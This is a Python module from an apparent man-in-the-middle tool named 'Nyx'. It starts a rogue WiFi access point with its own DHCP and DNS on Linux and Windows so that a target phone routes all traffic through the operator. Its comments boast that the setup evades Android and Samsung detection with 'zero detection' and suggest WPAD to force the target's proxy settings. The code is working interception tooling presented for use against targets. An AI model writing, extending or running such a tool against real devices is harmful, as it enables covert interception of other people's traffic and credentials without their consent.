"""WiFi Access Point / hotspot mode — the ultimate MITM bypass.

When a laptop turns its WiFi card into an Access Point, the target phone
connects to *us* and we become the legitimate DHCP server + gateway. There
is nothing to spoof — no ARP flooding, no NDP poisoning, no DHCP race. The
target simply routes through us the way it would through any router, so
Android/Samsung's "suspicious activity" detectors never fire (they detect
*spoofed* responses, not a normal router).

How it works per platform:
  - Linux:  hostapd (AP) + dnsmasq (DHCP/DNS) — the classic stack.
  - Windows: `netsh wlan set hostednetwork` (legacy) or the Windows Mobile
    Hotspot API via PowerShell. Falls back gracefully if the driver does not
    support hosted network.
  - macOS:  Internet Sharing via `networksetup`.

This module is **opportunistic**: it probes the platform capabilities and
returns a clear "not supported" if the wireless driver can't do it. The MITM
UI offers AP mode as an option; if unavailable it explains why.
"""
import asyncio
import logging
import platform
import shutil
import subprocess
import tempfile
from pathlib import Path

logger = logging.getLogger(__name__)

_SSID = "Nyx"
_PASSPHRASE = "nyxmitm2026"
_SUBNET = "192.168.42.0/24"
_GATEWAY = "192.168.42.1"
_DHCP_RANGE = "192.168.42.10,192.168.42.100,12h"


class WiFiAPError(Exception):
    """Raised when AP mode cannot be started on this platform."""


def _platform() -> str:
    return platform.system().lower()


def is_supported() -> dict:
    """Probe whether AP mode is possible on this machine.

    Returns a dict with ``supported`` bool and a human-readable ``reason``.
    """
    sys_platform = _platform()
    if sys_platform == "linux":
        if shutil.which("hostapd") and shutil.which("dnsmasq"):
            return {"supported": True, "reason": "hostapd + dnsmasq available"}
        return {
            "supported": False,
            "reason": "Linux AP mode requires hostapd + dnsmasq. "
            "Install: sudo apt install hostapd dnsmasq",
        }
    if sys_platform == "windows":
        # Probe hostednetwork support via netsh (works on most Intel/Realtek).
        try:
            out = subprocess.check_output(
                "netsh wlan show drivers", shell=True, timeout=8,
                stderr=subprocess.DEVNULL,
            ).decode("utf-8", errors="replace")
            if "Hosted network supported" in out and "Yes" in out:
                return {"supported": True, "reason": "Windows hosted network available"}
            return {
                "supported": False,
                "reason": "Wireless driver does not support hosted network. "
                "Use Windows 'Mobile Hotspot' manually, or use Linux with hostapd.",
            }
        except Exception as e:
            return {"supported": False, "reason": f"Could not probe: {e}"}
    if sys_platform == "darwin":
        return {
            "supported": True,
            "reason": "macOS Internet Sharing (enable manually in System Settings)",
        }
    return {"supported": False, "reason": f"Unsupported platform: {sys_platform}"}


class WiFiAPManager:
    """Start/stop a rogue access point with DHCP so targets route through us."""

    def __init__(self, ssid: str = _SSID, passphrase: str = _PASSPHRASE):
        self.ssid = ssid
        self.passphrase = passphrase
        self._running = False
        self._proc: subprocess.Popen | None = None
        self._hostapd_conf: str | None = None
        self._dnsmasq_conf: str | None = None

    async def start(self) -> dict:
        """Start the AP. Returns status dict. Raises WiFiAPError on failure."""
        sys_platform = _platform()
        if sys_platform == "linux":
            return await self._start_linux()
        if sys_platform == "windows":
            return await self._start_windows()
        if sys_platform == "darwin":
            raise WiFiAPError(
                "macOS AP mode requires manual Internet Sharing setup."
            )
        raise WiFiAPError(f"Unsupported platform: {sys_platform}")

    async def stop(self) -> None:
        """Tear down the AP and restore the interface."""
        self._running = False
        if self._proc:
            try:
                self._proc.terminate()
                await asyncio.wait_for(asyncio.to_thread(self._proc.wait), timeout=5)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None
        # Cleanup temp configs
        for path in (self._hostapd_conf, self._dnsmasq_conf):
            if path:
                try:
                    Path(path).unlink(missing_ok=True)
                except Exception:
                    pass
        sys_platform = _platform()
        try:
            if sys_platform == "windows":
                subprocess.run(
                    "netsh wlan stop hostednetwork", shell=True, timeout=10,
                    capture_output=True,
                )
            elif sys_platform == "linux":
                subprocess.run(
                    "pkill -f hostapd; pkill -f dnsmasq", shell=True, timeout=10,
                    capture_output=True,
                )
        except Exception:
            pass
        self._hostapd_conf = None
        self._dnsmasq_conf = None
        logger.info("WiFi AP stopped")

    async def _start_linux(self) -> dict:
        """hostapd + dnsmasq on Linux. Requires root."""
        import os
        if os.geteuid() != 0:
            raise WiFiAPError(
                "Linux AP mode requires root. Run Nyx as root (sudo)."
            )
        iface = self._find_wifi_iface_linux()
        if not iface:
            raise WiFiAPError("No WiFi interface found for AP mode")

        # hostapd config
        self._hostapd_conf = str(Path(tempfile.gettempdir()) / "nyx_hostapd.conf")
        Path(self._hostapd_conf).write_text(
            f"interface={iface}\n"
            f"ssid={self.ssid}\n"
            "hw_mode=g\n"
            "channel=6\n"
            "wmm_enabled=0\n"
            "macaddr_acl=0\n"
            "auth_algs=1\n"
            "ignore_broadcast_ssid=0\n"
            "wpa=2\n"
            f"wpa_passphrase={self.passphrase}\n"
            "wpa_key_mgmt=WPA-PSK\n"
            "wpa_pairwise=TKIP\n"
            "rsn_pairwise=CCMP\n"
        )

        # dnsmasq config: DHCP + DNS pointing to our proxy
        self._dnsmasq_conf = str(Path(tempfile.gettempdir()) / "nyx_dnsmasq.conf")
        Path(self._dnsmasq_conf).write_text(
            f"interface={iface}\n"
            f"dhcp-range={_DHCP_RANGE}\n"
            f"dhcp-option=3,{_GATEWAY}\n"   # default gateway = us
            f"dhcp-option=6,{_GATEWAY}\n"   # DNS = us
            "no-resolv\n"
            f"server={_GATEWAY}\n"
            "log-queries\n"
        )

        try:
            subprocess.run(f"ip link set {iface} up", shell=True, check=True, timeout=10)
            subprocess.run(
                f"ip addr add {_GATEWAY}/24 dev {iface}", shell=True, check=True, timeout=10
            )
            subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True, timeout=10)
            self._proc = subprocess.Popen(
                f"hostapd {self._hostapd_conf}",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            subprocess.Popen(
                f"dnsmasq --conf-file={self._dnsmasq_conf}",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            self._running = True
            return {
                "status": "ok",
                "mode": "wifi-ap",
                "ssid": self.ssid,
                "gateway": _GATEWAY,
                "dhcp_range": _DHCP_RANGE,
                "note": "Target connects to the 'Nyx' SSID — no spoofing, "
                "zero detection. Set the proxy to 192.168.42.1:8080 on the "
                "target, or use DHCP option 252 (WPAD) for automatic proxy.",
            }
        except Exception as e:
            raise WiFiAPError(f"Linux AP start failed: {e}")

    async def _start_windows(self) -> dict:
        """Windows hosted network (netsh). Requires Administrator."""
        try:
            # Set the SSID/passphrase and start
            set_cmd = (
                f'netsh wlan set hostednetwork mode=allow '
                f'ssid="{self.ssid}" key="{self.passphrase}"'
            )
            subprocess.run(set_cmd, shell=True, check=True, timeout=15,
                           capture_output=True)
            subprocess.run("netsh wlan start hostednetwork", shell=True,
                           check=True, timeout=15, capture_output=True)
            self._running = True
            return {
                "status": "ok",
                "mode": "wifi-ap",
                "ssid": self.ssid,
                "gateway": "192.168.137.1",  # Windows default ICS gateway
                "dhcp_range": "192.168.137.10-192.168.137.100",
                "note": "Target connects to the 'Nyx' SSID. Windows Internet "
                "Connection Sharing (ICS) must be enabled on the WiFi adapter "
                "(Control Panel > Network > Adapter > Sharing).",
            }
        except subprocess.CalledProcessError as e:
            raise WiFiAPError(
                f"Windows hosted network failed (driver may not support it): {e}"
            )
        except Exception as e:
            raise WiFiAPError(f"Windows AP start failed: {e}")

    @staticmethod
    def _find_wifi_iface_linux() -> str | None:
        """Find a WiFi interface (wlan0, wlpXsY) on Linux."""
        try:
            out = subprocess.check_output(
                "ls /sys/class/net/", shell=True, timeout=5
            ).decode().split()
            for iface in out:
                if iface.startswith(("wlan", "wl", "wlp", "wifi")):
                    return iface
            # Fallback: iw dev
            out = subprocess.check_output(
                "iw dev 2>/dev/null | grep Interface | awk '{print $2}'",
                shell=True, timeout=5,
            ).decode().split()
            if out:
                return out[0]
        except Exception as e:
            logger.debug("WiFi iface detection failed: %s", e)
        return None